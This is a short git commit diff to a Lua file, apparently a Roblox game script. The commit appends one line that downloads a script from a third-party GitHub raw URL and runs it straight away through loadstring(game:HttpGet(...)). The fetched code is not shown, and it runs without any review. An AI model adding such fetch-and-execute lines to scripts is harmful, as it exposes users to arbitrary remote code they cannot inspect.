0e41935bffb63e0556b1b738f2c6c95f924a9704
DEBIL59195 <prodavec4466@gmail.com>
2025-10-10 15:28:15 -0700

    Update nerabotaet.lua

--- nerabotaet.lua
+++ nerabotaet.lua
@@ -1368,3 +1368,4 @@ workspace.DescendantAdded:Connect(function(descendant)
         createBeautifulPurpleRemainingTime()
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
